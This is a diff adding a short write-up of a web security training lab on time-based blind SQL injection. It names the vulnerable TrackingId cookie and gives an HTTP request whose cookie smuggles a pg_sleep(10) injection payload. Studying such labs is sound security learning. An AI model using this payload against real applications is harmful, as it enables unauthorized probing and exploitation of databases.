@@ -8,10 +8,20 @@ To solve the lab, exploit the SQL injection vulnerability to cause a 10 second d
 
 ## Notes
 
-
+- `/login`
+- `/filter?category=parameter`
+- Vulnerable cookie: `TrackingId`
 
 ## Resume
 
-
+1. Exploit time based SQLi with `pg_sleep()`
 
 ## Solve 
+
+In order to triger a 10s delay : 
+
+```http
+GET /filter?category=Accessories HTTP/2
+Host: 0a800033048d423d81f7c55900b90039.web-security-academy.net
+Cookie: TrackingId=tOCkdiOO9Tlc4LRP'||pg_sleep(10)--; session=4j62ZTkY7YqLZuhEQdrXtqef1pJTlYE2
+```
